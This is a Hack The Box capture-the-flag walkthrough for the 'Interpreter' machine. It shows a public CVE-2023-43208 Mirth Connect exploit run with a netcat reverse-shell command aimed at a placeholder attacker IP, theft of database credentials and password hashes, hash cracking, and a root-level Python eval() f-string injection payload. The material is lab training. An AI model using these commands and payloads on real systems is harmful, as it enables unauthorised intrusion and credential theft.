<img width="445" height="257" alt="image" src="https://github.com/user-attachments/assets/a885189e-4022-40d3-8e3a-841ff101d02d" />

# Hack The Box: Interpreter Walkthrough

## 🖥️ Machine Overview
* **Name:** Interpreter
* **Difficulty:** Medium
* **OS:** Linux (Debian 12)
* **Vulnerabilities & Techniques:** CVE-2023-43208 (Mirth Connect RCE), Cleartext Credentials in Config, MariaDB Enumeration, PBKDF2 Hash Cracking, Python `eval()` f-string Injection (Privilege Escalation).

---

## 🔍 Reconnaissance

### Nmap Scan
We start by scanning the target (`10.129.8.152`) to identify open ports and running services.

<img width="1073" height="587" alt="Screenshot (91)" src="https://github.com/user-attachments/assets/06256d13-11b0-46b1-bd29-b3c31bd8f4df" />


```bash
nmap -sC -sV -p- 10.129.8.152
```

**Open Ports:**
* `22/tcp` - SSH (OpenSSH 9.2p1 Debian 12)
* `80/tcp` - HTTP (Jetty)
* `443/tcp` - HTTPS (Jetty - Mirth Connect Administrator)

### Web Enumeration
Navigating to port 80 redirects us to `http://10.129.8.152/webadmin/Index.action`, revealing the **NextGen Healthcare - Mirth Connect Administrator** interface. Clicking "Launch Mirth Connect Administrator" downloads a `webstart.jnlp` file. 

Inspecting the `.jnlp` file reveals the version of the software:
```xml
<jnlp codebase="http://10.129.3.78:80" version="4.4.0">
    <title>Mirth Connect Administrator 4.4.0</title>
```
Mirth Connect version **4.4.0** is vulnerable to **CVE-2023-43208**, an unauthenticated Remote Code Execution (RCE) vulnerability.

---

## 💥 Initial Access (CVE-2023-43208)

We can use a public PoC for CVE-2023-43208 to gain initial access.
<img width="457" height="287" alt="Screenshot (90)" src="https://github.com/user-attachments/assets/224477a5-5d22-4fc6-b7eb-b49daf36cb34" />

1. Clone the exploit repository:
```bash
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc.git
cd CVE-2023-43208-mirth-connect-rce-poc
```

2. Start a netcat listener on our attack machine:
```bash
nc -lvnp 4444
```

3. Execute the reverse shell payload:
```bash
python3 CVE-2023-43208.py -u https://10.129.8.152 -c 'nc -c sh <YOUR_IP> 4444'
```
<img width="1005" height="294" alt="Screenshot (92)" src="https://github.com/user-attachments/assets/c6119559-3ef9-40e5-9400-78ba9bf57ddf" />

We catch the shell as the `mirth` user. Let's upgrade it to a fully interactive TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<img width="463" height="287" alt="Screenshot (94)" src="https://github.com/user-attachments/assets/437b3667-96e0-4654-9022-0d5ba810db58" />

---

## 🕵️ Post-Exploitation & Lateral Movement

### Extracting Database Credentials
Since we are inside the Mirth Connect application context, checking configuration files is a priority. Navigating to `/usr/local/mirthconnect/conf/`, we find `mirth.properties`.

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```
<img width="1078" height="583" alt="Screenshot (95)" src="https://github.com/user-attachments/assets/d93af6fa-17d8-4ed0-ae0e-309dccba24df" />
<img width="1071" height="542" alt="Screenshot (96)" src="https://github.com/user-attachments/assets/8170a88b-f534-4fb2-97e0-230a30d32210" />

We discover hardcoded MariaDB credentials:
* **Database:** `mc_bdd_prod`
* **Username:** `mirthdb`
* **Password:** `MirthPass123!`

### Database Enumeration
We can access the local MariaDB database using these credentials:
```bash
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
```
We enumerate the database tables and extract the user information:
```sql
SHOW TABLES;
SELECT * FROM PERSON_PASSWORD;
SELECT * FROM PERSON;
```
**Result:** We identify the `sedric` user and their hash: `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`

### Hash Cracking
The password hash is base64 encoded. Decoding and manipulating it reveals it is a PBKDF2-HMAC-SHA256 hash (600,000 iterations). 

We prepare the hash for Hashcat:
`sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=`

Crack it using the `rockyou.txt` wordlist:
```bash
hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt
```
**Cracked Password:** `snowflake1`

### SSH as Sedric
We use the cracked password to SSH into the machine as `sedric` and grab the user flag:
```bash
sshpass -p 'snowflake1' ssh sedric@10.129.8.152
cat user.txt
```

---

## 🚀 Privilege Escalation (Root)

Checking for running processes, we spot a custom Python script running as `root`:
```bash
ps aux | grep python
root      ...  /usr/bin/python3 /usr/local/bin/notif.py
```

### Analyzing `notif.py`
Reading `/usr/local/bin/notif.py` reveals a local Flask application listening on `127.0.0.1:54321`. It processes XML patient data and generates notifications. 

The script restricts input using a regex, but allows braces `{}`. The critical vulnerability lies in the templating function:
```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
try:
    return eval(f"f'''{template}'''")
```
<img width="1072" height="587" alt="Screenshot (98)" src="https://github.com/user-attachments/assets/109d84ff-fdd5-4981-b13f-e4013ef31f88" />

The script uses `eval()` on an f-string populated by our XML input. This means any Python expression injected inside `{}` will be executed as root!

### Exploiting f-string `eval()` Injection
We can write a quick python script to send a malicious POST request. We inject `{open("/root/root.txt").read()}` into the `<firstname>` XML field to read the root flag.

```bash
python3 - << 'EOF'
import requests

url = "http://127.0.0.1:54321/addPatient"

xml = """<patient>
<firstname>{open("/root/root.txt").read()}</firstname>
<lastname>B</lastname>
<sender_app>X</sender_app>
<timestamp>t</timestamp>
<birth_date>01/01/2000</birth_date>
<gender>M</gender>
</patient>"""

r = requests.post(url, data=xml)
print(r.text)
EOF
```

<img width="881" height="489" alt="Screenshot (100)" src="https://github.com/user-attachments/assets/6c783c15-b49a-474c-8ae0-42bce10da70a" />


#### **Response:**
`Patient ******************************** B (M), 26 years old, received from X at t`

The `********************************` string is the evaluated root flag. System PWNED! 🏁
